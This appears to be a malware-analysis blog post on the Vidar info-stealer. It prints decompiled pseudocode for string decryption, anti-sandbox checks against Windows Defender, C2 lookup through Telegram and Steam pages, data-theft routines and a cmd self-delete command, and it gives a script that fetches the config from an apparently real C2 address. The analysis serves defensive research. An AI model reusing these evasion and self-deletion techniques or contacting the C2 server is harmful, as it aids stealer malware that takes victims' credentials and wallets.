---
layout: post
title: "Vidar Stealer"
date: 2023-11-10 21:21:21
categories: malware stealer windows
---

# Beginning

My little notes after analyzing Vidar stealer

Loader : [malware bazaar](https://bazaar.abuse.ch/sample/a59c57c65a4949bf1c9fd39f269cbdcfe500ea6842133dab9a2a4a979a7733d0/)

Unpacked file : [unpac.me](https://www.unpac.me/results/521b7fba-450d-4c79-8c4e-1e0d3ff2e666/#/)
# Strings decryption

More than half of the strings in the stealer are encrypted, to decrypt them you can create an IdaPython script or debug the program through the debugger manually, I chose the second option because I am not very familiar with IdaPython, this option took much more time. The decryption of all strings is divided into 2 functions, 1 function decrypts about ~20 strings, which are needed to determine if the machine on which the malware started is a Windows Defender sandbox. Once the program has verified that the user is real, it will decrypt the 2nd batch of strings, which contains about 400~ strings. The strange thing is that some encrypted strings have their unencrypted clones. Below is a function that decrypts 1 bunch of strings, 2 function contains too many strings, if you want to see the full list, check pseudocode on out the repository I specified at the beginning.

```cpp
const CHAR *decrypt_strings_stage_1()
{
  const CHAR *kernel32_str; // eax

  dword_448E98 = "87037979267274204123";
  HAL9TH_str = (int)decrypt_str("lCu26VdU");    // HAL9TH
  JohnDoe_str = (int)decrypt_str("lgWSvkdzsA==");// JohnDoe
  LoadLibraryA_str = (LPCSTR)decrypt_str("kAWbtE91tweQq/zz");// LoadLibraryA
  lstrcatA_str = (int)decrypt_str("sBmOomB9oTQ=");// lstrcatA
  GetProcessAdress_str = (LPCSTR)decrypt_str("mw+OgHFztjSVvffX988=");// GetProcessAdress
  Sleep_str = (void (__stdcall *)(DWORD))decrypt_str("jwaftXM=");
  GetSystemTime_str = (int)decrypt_str("mw+Og3pvoRCcjezf4Q==");
  ExitProcess_str = (int)decrypt_str("mRKTpFNuuhaUqvY=");
  GetCurrentProcess_str = (int)decrypt_str("mw+Ok3ZupxCfrdXA699K14g=");
  VirtualAllocExNuma_str = (LPVOID (__stdcall *)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD))decrypt_str(
                                                                                                "igOIpHZ9uTSdterRwcRh0ZaP");
  VirtualAlloc_str = (int)decrypt_str("igOIpHZ9uTSdterR");
  VirtualFree_str = (int)decrypt_str("igOIpHZ9uTODvOA=");
  lstrcmpiW_str = (int)decrypt_str("sBmOomBxpRym");
  LocalAlloc_str = (int)decrypt_str("kAWZsW9duRmeug==");
  GetComputerNameA_str = (int)decrypt_str("mw+Ok2xxpXWFvPf85dFK5Q==");
  advapi32dll_str = (LPCSTR)decrypt_str("vQ6MsXN15kffvene");
  GetUserNameA_str = (int)decrypt_str("mw+OhXB5pzuQtODz");
  kernel32_str = (const CHAR *)decrypt_str("tw+IvmZw5kffvene");
  kernel32_str_1 = kernel32_str;
  return kernel32_str;
}
```

# Anti Windows Defender Sandbox 

The anti-sandbox functions are aimed at protecting against Windows Defender dynamic analysis sandbox.Techniques for bypassing it have been written about [here](https://book.hacktricks.xyz/windows-hardening/av-bypass). They do not interfere in any way with tracing through a normal debugger.

```cpp
int anti_windows_defender_sandbox_check_displaysize()
{
  HDC diplay_; // edi
  int DeviceCaps; // ebx
  int HORZSIZE; // eax

  diplay_ = CreateDCA("DISPLAY", 0, 0, 0);
  DeviceCaps = GetDeviceCaps(diplay_, 8);
  HORZSIZE = ReleaseDC(0, diplay_);
  if ( DeviceCaps < 665 )
    ExitProcess(0);
  return HORZSIZE;
}
```

Function gets the display length, if the display length is less than 665 pixels, the malware will terminate.

```cpp
int anti_windows_defender_sandbox_checkmemory()
{
  unsigned int v0; // ecx
  int result; // eax
  struct _MEMORYSTATUSEX Buffer; // [esp+0h] [ebp-44h] BYREF

  memset(&Buffer, 0, sizeof(Buffer));
  Buffer.dwLength = 64;
  if ( GlobalMemoryStatusEx(&Buffer) )
  {
    v0 = Buffer.ullTotalPhys >> 20;
    result = HIDWORD(Buffer.ullTotalPhys) >> 20;
  }
  else
  {
    v0 = 0;
    result = 0;
  }
  if ( !result && v0 < 777 )
    ExitProcess(0);
  return result;
}
```
Function gets the amount of free RAM in the system, if the amount of memory is less than 777mb, the malware will terminate.

```cpp
int anti_windows_defender_sandbox_checkname()
{
  int result; // eax

  result = strcmp(get_computer_name(), (const char *)HAL9TH_str);
  if ( result )
    return result;
  result = strcmp(get_username(), (const char *)JohnDoe_str);
  if ( !result )
    ExitProcess_0(0);
  return result;
}
```
Compares the current computer name with the string "HAL9TH", which is the name of the computer in the Windows Defender sandbox

All of this works because windows defender cannot allocate a lot of resources to the virtual machine to run, as this would severely affect the main system and slow it down a lot

# Anti double start

This feature prevents two malware from starting and running at the same time.

```cpp
HANDLE v4;
HANDLE hPc_hwid_1;
char pc_hwid_1[500] = "pc hwid here";
while ( 1 )                                   // anti double run
{
    v4 = OpenEventA(0x1F0003u, 0, pc_hwid_1);
    hPc_hwid_1 = (int)v4;
    if ( !v4 )
      break;
    CloseHandle_0(v4);
    Sleep_0(5000u);
}
hPc_hwid_1 = (int)CreateEventA(0, 0, 0, pc_hwid_1);
```

The function tries to open an event with the hardware id and if the operation is successful, it goes to sleep for some time, if it fails to open the event, malware will create a new one, thus blocking the launch of copies until the process is finished.


# Getting c2 ip

Malware uses a very interesting system to get the ip c2 panel to connect, it parses it from the channel description in telegram and the nickname of the account in steam

![telegram_and_steam_links](/posts_assets/vidar-stealer/telegram_and_steam_links.png)

It receives the page in html format and parses the data from the keyword to the final character. With steam the same situation, so I will not insert a screenshot, there c2 ip is inserted instead of the name

![telegram_c2_ip](/posts_assets/vidar-stealer/telegram_c2_ip.png)

This method has both minuses and pluses, one of the pluses is that the attacker does not need to change the build after changing the server, in case he is blocked for abuse. But at the same time any researcher getting a link to telegram or steam will be able to send reports to your host about the abuse.

Small script for automatic configuration extraction

```python
import binary2strings as b2s

def extract(binary_name):
    with open(binary_name,"rb") as bin:
        data = bin.read()
        for (string, type, span, is_interesting) in b2s.extract_all_strings(data):
            if(string.__contains__("t.me")):
                print(f"[Vidar] Telegram : {string}")
            if(string.__contains__("https://steamcommunity.com/")):
                print(f"[Vidar] Steam : {string}")
        
if __name__ == "__main__":
    print("[Vidar] Vidar config extractor")
    bin_name = input("[Vidar] Enter bin name : ")
    extract(bin_name)
       
```

# Getting config from server

One of the things that malware does after getting ip c2 is to get the config from the web panel.

```
1,1,1,1,0,01d840b66e79a2d9df6676ce25834f97,1,1,1,1,0,Default;%DOCUMENTS%\;*.txt;50;true;*windows*;,1
```

Parameters are responsible for enabling and disabling the collection functions, such as collecting discord, crypto wallets, ssnf steam data, as well as paths and types of files to be collected by filegrabber, whether stealer needs to delete itself after completion.

```python
import requests

settings_list = ["unknown param : ","unknown param : ","unknown param : ","steal Crypto Wallet : ","steal Discord Data : ","unknown param : ","unknown param : ","grab screenshot : ","unknown param : ","grab steam : ","unknown param : ","file grab list : ","self delete : "]
c2_cfg = 'http://157.90.152.131:2083/dbc6cdbef612cd0a4cea9b2f05f89628'

header = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:110.0) Gecko/20100101 Firefox/119.0"}
c = requests.get(c2_cfg,headers=header)
splited = c.text.split(",")

print("[+] Config : ")

count = 0
for a in splited:
    print(settings_list[count]," ",a)
    count+=1
```

I wrote a simple script in python that helps to determine which parameter is responsible for what, but because of, due to my laziness half of the parameters are marked as unknown.

# Data stealing

Data collection as in other stealers are several functions designed to collect browser, discord, steam, telegram, crypto wallets and general information about the victim's computer.

```cpp
steal_broweser_data_and_tg((int)v35, (int)v40, v41);
if ( steam_steal_config )
    steal_steam_data();
if ( discord_steal_config )
    steal_discord_data();
  get_computer_info((_DWORD *)dword_449480);
if ( crypto_wallet_steal_config )
    steal_crypto_wallet(v59, dword_449480);
  file_grab((const CHAR *)file_grab_list, (_DWORD *)dword_449480);
if ( get_screenshot_config )
    get_screenshot(70, (_DWORD *)dword_449480);
```

The only interesting thing here is that it collects data from Vietnamese no-name browsers based on Chromium and that it collects data from the now defunct Russian browser Amigo and its follower Orbitum

# Log encryption

The collected log is stored in memory and encrypted using standard base64

```cpp
bool __cdecl crypt_log(LPSTR *out, size_t *pcchString, BYTE *pbBinary, DWORD cbBinary)
{
  HANDLE ProcessHeap_0; // eax
  CHAR *v6; // eax
  SIZE_T v7; // [esp-Ch] [ebp-10h]

  if ( !pbBinary )
    return 0;
  if ( !CryptBinaryToStringA(pbBinary, cbBinary, 0x40000001u, 0, pcchString) )
    return 0;
  v7 = *pcchString;
  ProcessHeap_0 = GetProcessHeap_0();
  v6 = (CHAR *)HeapAlloc_0(ProcessHeap_0, 0, v7);
  *out = v6;
  if ( !v6 )
    return 0;
  memset(v6, 0, *pcchString);
  return CryptBinaryToStringA(pbBinary, cbBinary, 0x40000001u, *out, pcchString);
}
```

# Self delete

This function will remove the malware after successful execution if the parameter responsible for this is true in the config received from the server

```cpp
void __noreturn self_delete()
{
  DWORD pid; // eax
  int file_name; // eax
  bool v2; // cf
  SHELLEXECUTEINFOA pExecInfo; // [esp+10h] [ebp-16Ch] BYREF
  void *v4[7]; // [esp+4Ch] [ebp-130h] BYREF
  CHAR shell_comand[272]; // [esp+68h] [ebp-114h] BYREF
  int v6; // [esp+178h] [ebp-4h]

  memset(shell_comand, 0, 0x104u);
  memset(&pExecInfo, 0, sizeof(pExecInfo));
  lstrcatA_0(shell_comand, "/c ");
  lstrcatA_0(shell_comand, "timeout /t 6 & del /f /q \"");
  pid = GetCurrentProcessId_0();
  file_name = get_file_name((int)v4, pid);
  v2 = *(_DWORD *)(file_name + 20) < 0x10u;
  v6 = 0;
  if ( !v2 )
    file_name = *(_DWORD *)file_name;
  lstrcatA_0(shell_comand, (LPCSTR)file_name);
  v6 = -1;
  std::string::_Tidy(v4, 1, 0);
  lstrcatA_0(shell_comand, "\" & exit");
  pExecInfo.lpParameters = shell_comand;
  pExecInfo.cbSize = 60;
  pExecInfo.fMask = 0;
  pExecInfo.hwnd = 0;
  pExecInfo.lpVerb = "open";
  pExecInfo.lpFile = "C:\\Windows\\System32\\cmd.exe";
  memset(&pExecInfo.lpDirectory, 0, 12);
  ShellExecuteExA(&pExecInfo);
  memset(&pExecInfo, 0, sizeof(pExecInfo));
  memset(shell_comand, 0, 0x104u);
  ExitProcess_0(0);
}
```

# End

I wanted to leave in the article the most interesting and not to insert trivial things characteristic of each stealer, detailed only those things that seemed to me interesting.




